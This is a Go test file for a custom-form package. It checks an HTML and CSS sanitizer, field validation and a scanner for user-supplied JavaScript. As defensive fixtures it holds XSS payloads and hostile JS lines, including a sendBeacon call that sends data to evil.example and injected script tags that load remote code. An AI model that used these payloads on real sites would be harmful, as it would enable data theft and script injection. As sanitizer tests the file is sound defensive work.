package customform

import (
	"strings"
	"testing"
)

func TestSanitizeHTMLStripsScriptsAndHandlers(t *testing.T) {
	in := `<div><label>Name</label><input type="text" name="name" required></div>
<script>alert(1)</script><p onclick="evil()">hi</p>`
	out := SanitizeHTML(in)
	if strings.Contains(out, "<script") {
		t.Errorf("script not stripped: %s", out)
	}
	if strings.Contains(out, "onclick") {
		t.Errorf("event handler not stripped: %s", out)
	}
	if !strings.Contains(out, `name="name"`) {
		t.Errorf("valid input stripped: %s", out)
	}
}

func TestSanitizeHTMLStripsExternalAndJavascriptURLs(t *testing.T) {
	in := `<a href="javascript:alert(1)">x</a><a href="https://evil.com">ext</a><a href="/local">rel</a>`
	out := SanitizeHTML(in)
	if strings.Contains(out, "javascript:") {
		t.Errorf("javascript: URL not stripped: %s", out)
	}
	if strings.Contains(out, "https://evil.com") {
		t.Errorf("external link not stripped: %s", out)
	}
	if !strings.Contains(out, `href="/local"`) {
		t.Errorf("relative link stripped: %s", out)
	}
}

func TestSanitizeHTMLStripsIframeObject(t *testing.T) {
	in := `<iframe src="https://evil.com"></iframe><object data="x"></object><p>ok</p>`
	out := SanitizeHTML(in)
	if strings.Contains(out, "iframe") || strings.Contains(out, "object") {
		t.Errorf("embedding element not stripped: %s", out)
	}
	if !strings.Contains(out, "ok") {
		t.Errorf("safe content lost: %s", out)
	}
}

func TestSanitizeHTMLStripsUnsafeCSS(t *testing.T) {
	in := `<p style="color:red;background:url(https://evil.com/x);font-size:20px">styled</p>`
	out := SanitizeHTML(in)
	if strings.Contains(out, "url(") {
		t.Errorf("url() style not stripped: %s", out)
	}
	if !strings.Contains(out, "color: red") {
		t.Errorf("safe style stripped: %s", out)
	}
}

func TestSanitizeHTMLStripsFormAction(t *testing.T) {
	in := `<form action="https://evil.com"><input name="a"></form>`
	out := SanitizeHTML(in)
	if strings.Contains(out, "action=") {
		t.Errorf("form action not stripped: %s", out)
	}
	if !strings.Contains(out, `name="a"`) {
		t.Errorf("input lost: %s", out)
	}
}

func TestValidateContract(t *testing.T) {
	valid := &Config{HTML: "<div></div>", Fields: []Field{
		{ID: "name", Type: "text", Label: "Name", Required: true},
		{ID: "email", Type: "email", Label: "Email"},
	}}
	if err := Validate(valid); err != nil {
		t.Fatalf("valid contract rejected: %v", err)
	}

	// Missing field_id.
	if err := Validate(&Config{Fields: []Field{{Type: "text"}}}); err == nil {
		t.Fatal("missing field_id accepted")
	}
	// Duplicate field_id.
	if err := Validate(&Config{Fields: []Field{
		{ID: "a", Type: "text"}, {ID: "a", Type: "text"},
	}}); err == nil {
		t.Fatal("duplicate field_id accepted")
	}
	// Invalid type.
	if err := Validate(&Config{Fields: []Field{{ID: "a", Type: "bogus"}}}); err == nil {
		t.Fatal("invalid type accepted")
	}
}

func TestCollectOnlyRegisteredFields(t *testing.T) {
	cc := &Config{Fields: []Field{
		{ID: "name", Type: "text"},
		{ID: "email", Type: "email"},
	}}
	data := map[string]any{
		"name":  "Ali",
		"email": "ali@example.test",
		"hack":  "injected",
		"jf_ts": "123",
	}
	out := Collect(cc, data)
	if out["name"] != "Ali" || out["email"] != "ali@example.test" {
		t.Fatalf("registered fields not collected: %v", out)
	}
	if _, ok := out["hack"]; ok {
		t.Errorf("unregistered field collected: %v", out)
	}
	if _, ok := out["jf_ts"]; ok {
		t.Errorf("anti-spam field collected: %v", out)
	}
}

func TestSanitizeStyleAllowsSafeCSSOnly(t *testing.T) {
	// Safe properties are kept.
	out := SanitizeStyle("color:red;font-size:20px;margin-top:4px")
	if !strings.Contains(out, "color: red") || !strings.Contains(out, "font-size: 20px") {
		t.Errorf("safe style stripped: %q", out)
	}
	// url()/background-image are stripped (no remote request vector).
	out = SanitizeStyle("color:red;background-image:url(https://evil.com/x);background:url(https://evil.com/y)")
	if strings.Contains(out, "url(") {
		t.Errorf("url() style not stripped: %q", out)
	}
	if !strings.Contains(out, "color: red") {
		t.Errorf("safe style lost alongside url(): %q", out)
	}
	// Empty input → empty output.
	if SanitizeStyle("") != "" || SanitizeStyle("   ") != "" {
		t.Errorf("empty style not normalized to empty")
	}
	// A style that is entirely unsafe → empty.
	if SanitizeStyle("background-image:url(https://evil.com/x)") != "" {
		t.Errorf("fully-unsafe style not emptied")
	}
}

// TestSanitizeStyleKeepsWhiteSpace guards a misspelt CSS property in the
// allowlist: the list carried `white-workspace` — a property that does not exist
// (the real one, per MDN, is `white-space`) — so a power user's
// `white-space:pre-wrap` was silently stripped from their inline style. Nothing
// caught it because the allowlist was only ever asserted on properties that do
// exist; a misspelt entry is invisible until someone uses the property it was
// meant to allow.
func TestSanitizeStyleKeepsWhiteSpace(t *testing.T) {
	out := SanitizeStyle("white-space:pre-wrap")
	if !strings.Contains(out, "white-space") {
		t.Errorf("white-space was stripped from an inline style (out: %q) — the allowlist must name the real CSS property, not `white-workspace`", out)
	}
	// The misspelt property must not be what makes it through.
	if strings.Contains(out, "white-workspace") {
		t.Errorf("the allowlist emitted the misspelt property name: %q", out)
	}
	for _, want := range []string{"white-space:nowrap", "white-space:pre"} {
		if got := SanitizeStyle(want); !strings.Contains(got, "white-space") {
			t.Errorf("%q did not survive sanitizing: %q", want, got)
		}
	}
}

func TestScanCustomJSBlocksMaliciousAllowsBenign(t *testing.T) {
	// Malicious: dynamic code execution / obfuscation / external loads.
	for _, js := range []string{
		"eval(atob('x'))",
		"document.write('<script src=\"//evil.example/x.js\"></script>')",
		"a.constructor.constructor('alert(1)')()",
		"navigator.sendBeacon('https://evil.example/collect', data)",
		"var s=document.createElement('script'); s.src='https://evil.example/x.js';",
	} {
		if r := ScanCustomJS(js); r == "" {
			t.Errorf("malicious JS not blocked: %q", js)
		}
	}
	// Benign: ordinary form-behaviour JS (event handlers, validation, the
	// owner's own analytics) must pass.
	for _, js := range []string{
		"document.querySelector('#of').addEventListener('submit', function(e){ console.log('hi'); });",
		"function validate(){ var email=document.getElementById('email').value; return email.indexOf('@')>=0; }",
		"document.getElementById('total').textContent = 'RM10.00';",
	} {
		if r := ScanCustomJS(js); r != "" {
			t.Errorf("benign JS blocked: %q (%s)", js, r)
		}
	}
	// Empty → no reason.
	if r := ScanCustomJS(""); r != "" {
		t.Errorf("empty JS blocked: %s", r)
	}
}

func TestEnabledAndFromConfig(t *testing.T) {
	cfg := map[string]any{
		"mode": "response",
		ConfigKey: map[string]any{
			"html":   "<div>hi</div>",
			"fields": []any{map[string]any{"field_id": "a", "type": "text"}},
		},
	}
	if !Enabled(cfg) {
		t.Fatal("Enabled() = false, want true")
	}
	cc := FromConfig(cfg)
	if cc == nil || cc.HTML != "<div>hi</div>" || len(cc.Fields) != 1 {
		t.Fatalf("FromConfig = %+v", cc)
	}
	// Empty html → not enabled.
	if Enabled(map[string]any{ConfigKey: map[string]any{"html": "  "}}) {
		t.Fatal("Enabled() = true for empty html")
	}
	// No custom_html → not enabled.
	if Enabled(map[string]any{"mode": "response"}) {
		t.Fatal("Enabled() = true without custom_html")
	}
}
